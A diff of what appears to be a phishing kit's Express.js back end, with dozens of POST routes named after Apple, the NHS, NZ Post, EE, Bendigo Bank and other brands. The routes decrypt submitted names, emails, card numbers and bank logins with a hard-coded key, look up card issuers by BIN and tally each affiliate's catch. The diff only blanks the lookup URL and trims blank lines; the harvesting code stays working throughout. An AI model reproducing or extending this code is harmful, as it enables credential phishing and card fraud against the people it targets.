@@ -7039,7 +6815,6 @@ app.post("/sendBigBillz20", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 let kelvCount = 0;
 
@@ -7090,7 +6865,7 @@ app.post("/sendKelvYodelRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7123,7 +6898,6 @@ app.post("/sendKelvYodelRes", (req, res) => {
 //EE
 //EE
 //EE
-
 
 app.post("/c2EE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7177,7 +6951,7 @@ app.post("/c2EE", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7234,7 +7008,6 @@ app.post("/c2EE", (req, res) => {
     });
 });
 
-
 app.post("/eeKelv", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -7287,7 +7060,7 @@ app.post("/eeKelv", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7320,7 +7093,6 @@ app.post("/eeKelv", (req, res) => {
 //NZPOST
 //NZPOST
 //NZPOST
-
 
 app.post("/nzpostFirst", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -7371,7 +7143,7 @@ app.post("/nzpostFirst", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -7434,7 +7206,6 @@ app.post("/nzpostFirst", (req, res) => {
 //SFE
 
 let bandz = 0;
-
 
 app.post("/chopsSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7510,7 +7281,6 @@ app.post("/chopsSFE", (req, res) => {
   }
   res.send("Update Complete");
 });
-
 
 app.post("/bandzSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7589,7 +7359,6 @@ app.post("/bandzSFE", (req, res) => {
 
 let richgame = 0;
 
-
 app.post("/richgameSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -7667,7 +7436,6 @@ app.post("/richgameSFE", (req, res) => {
 
 let jv = 0;
 
-
 app.post("/cypherSFE", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -7742,7 +7510,6 @@ app.post("/cypherSFE", (req, res) => {
   }
   res.send("Update Complete");
 });
-
 
 app.post("/sfeJV", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7819,7 +7586,6 @@ app.post("/sfeJV", (req, res) => {
   res.send("Update Complete");
 });
 
-
 app.post("/sfeNBA", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
     CryptoJS.enc.Utf8
@@ -7894,7 +7660,6 @@ app.post("/sfeNBA", (req, res) => {
   }
   res.send("Update Complete");
 });
-
 
 app.post("/sfeChasing", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -7987,7 +7752,6 @@ app.post("/sfeChasing", (req, res) => {
 //APPLE ES
 //APPLE ES
 
-
 app.post("/kelvAppleSpain", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8038,7 +7802,7 @@ app.post("/kelvAppleSpain", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8098,7 +7862,6 @@ app.post("/kelvAppleSpain", (req, res) => {
 //APPLE AU
 //APPLE AU
 
-
 app.post("/johnAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8152,7 +7915,7 @@ app.post("/johnAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8220,7 +7983,6 @@ app.post("/johnAppleAu", (req, res) => {
     });
 });
 
-
 app.post("/kelvAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8274,7 +8036,7 @@ app.post("/kelvAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8342,7 +8104,6 @@ app.post("/kelvAppleAu", (req, res) => {
     });
 });
 
-
 app.post("/osbAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8396,7 +8157,7 @@ app.post("/osbAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8452,7 +8213,6 @@ app.post("/osbAppleAu", (req, res) => {
     });
 });
 
-
 app.post("/fredAppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8506,7 +8266,7 @@ app.post("/fredAppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8562,7 +8322,6 @@ app.post("/fredAppleAu", (req, res) => {
     });
 });
 
-
 app.post("/t1AppleAu", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8616,7 +8375,7 @@ app.post("/t1AppleAu", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8676,7 +8435,6 @@ app.post("/t1AppleAu", (req, res) => {
 //APPLE
 //APPLE
 
-
 app.post("/pweightApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -8730,7 +8488,7 @@ app.post("/pweightApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8785,7 +8543,6 @@ app.post("/pweightApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/dpApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8846,7 +8603,7 @@ app.post("/dpApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -8901,7 +8658,6 @@ app.post("/dpApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/rondoApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -8962,7 +8718,7 @@ app.post("/rondoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9018,7 +8774,6 @@ app.post("/rondoApple", (req, res) => {
     });
 });
 
-
 app.post("/ghostApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -9072,7 +8827,7 @@ app.post("/ghostApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9127,7 +8882,6 @@ app.post("/ghostApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/smokedApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9188,7 +8942,7 @@ app.post("/smokedApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9244,7 +8998,6 @@ app.post("/smokedApple", (req, res) => {
     });
 });
 
-
 app.post("/trizApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -9298,7 +9051,7 @@ app.post("/trizApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9326,7 +9079,6 @@ app.post("/trizApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/tcapzApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9381,7 +9133,7 @@ app.post("/tcapzApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9439,7 +9191,6 @@ app.post("/tcapzApple", (req, res) => {
 
 let fasterpayments = 0;
 
-
 app.post("/fasterpaymApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -9493,7 +9244,7 @@ app.post("/fasterpaymApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9551,7 +9302,6 @@ app.post("/fasterpaymApple", (req, res) => {
 
 let blackTesco = 0;
 
-
 app.post("/blacktescoApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
     CryptoJS.enc.Utf8
@@ -9605,7 +9355,7 @@ app.post("/blacktescoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9660,7 +9410,6 @@ app.post("/blacktescoApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/yardzApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9721,7 +9470,7 @@ app.post("/yardzApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9776,7 +9525,6 @@ app.post("/yardzApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/osbApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9837,7 +9585,7 @@ app.post("/osbApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -9894,7 +9642,6 @@ app.post("/osbApple", (req, res) => {
 });
 
 let cya = 10;
-
 
 app.post("/cyaApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9955,7 +9702,7 @@ app.post("/cyaApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10000,7 +9747,6 @@ app.post("/cyaApple", (req, res) => {
 });
 
 let heisenberg = 0;
-
 
 app.post("/heisenbergApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10061,7 +9807,7 @@ app.post("/heisenbergApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10118,7 +9864,6 @@ app.post("/heisenbergApple", (req, res) => {
 });
 
 let pablo = 0;
-
 
 app.post("/pabloApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10179,7 +9924,7 @@ app.post("/pabloApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10234,7 +9979,6 @@ app.post("/pabloApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 let mazCount = 3;
 
@@ -10297,7 +10041,7 @@ app.post("/sendMazzaAppleRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10327,7 +10071,6 @@ app.post("/sendMazzaAppleRes", (req, res) => {
       }
     });
 });
-
 
 app.post("/sendStrictlyAppleRes", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10388,7 +10131,7 @@ app.post("/sendStrictlyAppleRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10422,7 +10165,6 @@ app.post("/sendStrictlyAppleRes", (req, res) => {
 let sbCount = 15;
 
 let pastebk = 0;
-
 
 app.post("/applePasteBk", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10483,7 +10225,7 @@ app.post("/applePasteBk", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10538,7 +10280,6 @@ app.post("/applePasteBk", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/applePoka", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10599,7 +10340,7 @@ app.post("/applePoka", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10656,7 +10397,6 @@ app.post("/applePoka", (req, res) => {
 });
 
 let firstTrust = 0;
-
 
 app.post("/appleFirstTrust", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10717,7 +10457,7 @@ app.post("/appleFirstTrust", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10772,7 +10512,6 @@ app.post("/appleFirstTrust", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/appleSB", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10833,7 +10572,7 @@ app.post("/appleSB", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10863,7 +10602,6 @@ app.post("/appleSB", (req, res) => {
 });
 
 let p2 = 0;
-
 
 app.post("/appleP2", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10924,7 +10662,7 @@ app.post("/appleP2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -10981,7 +10719,6 @@ app.post("/appleP2", (req, res) => {
 });
 
 var cdbCount = 0;
-
 
 app.post("/spooferGooferApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11042,7 +10779,7 @@ app.post("/spooferGooferApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11069,7 +10806,6 @@ app.post("/spooferGooferApple", (req, res) => {
       }
     });
 });
-
 
 app.post("/kelvApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11130,7 +10866,7 @@ app.post("/kelvApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11159,7 +10895,6 @@ app.post("/kelvApple", (req, res) => {
 });
 
 var swipesC = 0;
-
 
 app.post("/swipesApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11220,7 +10955,7 @@ app.post("/swipesApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11248,7 +10983,6 @@ app.post("/swipesApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/daangerApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11309,7 +11043,7 @@ app.post("/daangerApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11336,7 +11070,6 @@ app.post("/daangerApple", (req, res) => {
       }
     });
 });
-
 
 app.post("/fpaysApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11397,7 +11130,7 @@ app.post("/fpaysApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11453,7 +11186,6 @@ app.post("/fpaysApple", (req, res) => {
 });
 
 var ciscoCount = 6;
-
 
 app.post("/ciscoApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11513,7 +11245,7 @@ app.post("/ciscoApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11541,7 +11273,6 @@ app.post("/ciscoApple", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/onlymyApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11602,7 +11333,7 @@ app.post("/onlymyApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11631,7 +11362,6 @@ app.post("/onlymyApple", (req, res) => {
 });
 
 let nchroCount = 10;
-
 
 app.post("/nchroApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11692,7 +11422,7 @@ app.post("/nchroApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11746,7 +11476,6 @@ app.post("/nchroApple", (req, res) => {
       }
     });
 });
-
 
 app.post("/chasedabag24s", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11806,7 +11535,7 @@ app.post("/chasedabag24s", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11837,7 +11566,6 @@ app.post("/chasedabag24s", (req, res) => {
 });
 
 let clearstore = 0;
-
 
 app.post("/baliApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11898,7 +11626,7 @@ app.post("/baliApple", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -11959,7 +11687,6 @@ app.post("/baliApple", (req, res) => {
 
 let wpCount = 0;
 
-
 app.post("/wpSaveLogin", (req, res) => {
   customerId = req.body.customerId;
   password = req.body.password;
@@ -11990,7 +11717,6 @@ app.post("/wpSaveLogin", (req, res) => {
 
 let skiiBendigo = 0;
 
-
 app.post("/bendigoLogin", (req, res) => {
   accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
     CryptoJS.enc.Utf8
@@ -12017,7 +11743,6 @@ app.post("/bendigoLogin", (req, res) => {
   }
   res.send("Update Completed");
 });
-
 
 app.post("/bendigoSkii", (req, res) => {
   accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
@@ -12057,7 +11782,6 @@ app.post("/bendigoSkii", (req, res) => {
 //NHS
 //NHS
 //NHS
-
 
 app.post("/ciscoNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12102,7 +11826,7 @@ app.post("/ciscoNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12158,7 +11882,6 @@ app.post("/ciscoNHS", (req, res) => {
     });
 });
 
-
 app.post("/rolloNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -12202,7 +11925,7 @@ app.post("/rolloNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12258,7 +11981,6 @@ app.post("/rolloNHS", (req, res) => {
     });
 });
 
-
 app.post("/cyaNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
     CryptoJS.enc.Utf8
@@ -12302,7 +12024,7 @@ app.post("/cyaNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12345,7 +12067,6 @@ app.post("/cyaNHS", (req, res) => {
       res.send("Update Complete");
     });
 });
-
 
 app.post("/sendKelvFriendResTwo", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12390,7 +12111,7 @@ app.post("/sendKelvFriendResTwo", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12425,7 +12146,6 @@ app.post("/sendKelvFriendResTwo", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/@kworthy1", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12470,7 +12190,7 @@ app.post("/@kworthy1", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12502,7 +12222,6 @@ app.post("/@kworthy1", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/stillrunning", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12547,7 +12266,7 @@ app.post("/stillrunning", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12581,7 +12300,6 @@ app.post("/stillrunning", (req, res) => {
 });
 
 let Spoofergoofer = 4;
-
 
 app.post("/spoofergooferNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12626,7 +12344,7 @@ app.post("/spoofergooferNHS", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12648,7 +12366,6 @@ app.post("/spoofergooferNHS", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/nhsMason", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12693,7 +12410,7 @@ app.post("/nhsMason", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12726,7 +12443,6 @@ app.post("/nhsMason", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/@kworthy12", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12771,7 +12487,7 @@ app.post("/@kworthy12", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12803,7 +12519,6 @@ app.post("/@kworthy12", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/Tarrifi", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12848,7 +12563,7 @@ app.post("/Tarrifi", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12877,7 +12592,6 @@ app.post("/Tarrifi", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/littlewaynesjobs", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12922,7 +12636,7 @@ app.post("/littlewaynesjobs", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -12951,7 +12665,6 @@ app.post("/littlewaynesjobs", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/sendKelvFriendRes", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12996,7 +12709,7 @@ app.post("/sendKelvFriendRes", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13030,7 +12743,6 @@ app.post("/sendKelvFriendRes", (req, res) => {
 });
 
 let fpaysC = 10;
-
 
 app.post("/sendFpays2", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13075,7 +12787,7 @@ app.post("/sendFpays2", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13106,7 +12818,6 @@ app.post("/sendFpays2", (req, res) => {
 });
 
 let masterboy = 0;
-
 
 app.post("/M4STERB0Y", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13151,7 +12862,7 @@ app.post("/M4STERB0Y", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13182,7 +12893,6 @@ app.post("/M4STERB0Y", (req, res) => {
 });
 
 let skiii719 = 0;
-
 
 app.post("/skiii719", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13227,7 +12937,7 @@ app.post("/skiii719", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13255,7 +12965,6 @@ app.post("/skiii719", (req, res) => {
 });
 
 let Tcapz688 = 0;
-
 
 app.post("/Tcapz688", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13300,7 +13009,7 @@ app.post("/Tcapz688", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13329,7 +13038,6 @@ app.post("/Tcapz688", (req, res) => {
       res.send("Update Completed");
     });
 });
-
 
 app.post("/actualTcapz688", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13374,7 +13082,7 @@ app.post("/actualTcapz688", (req, res) => {
     bin = formatBin;
   }
   axios
-    .get(`https://lookup.binlist.net/${bin}`)
+    .get(``)
     .then((resp) => {
       if (!resp.data.bank) {
         bankName = "";
@@ -13405,7 +13113,6 @@ app.post("/actualTcapz688", (req, res) => {
 });
 
 let mannyman789 = 0;
-
 
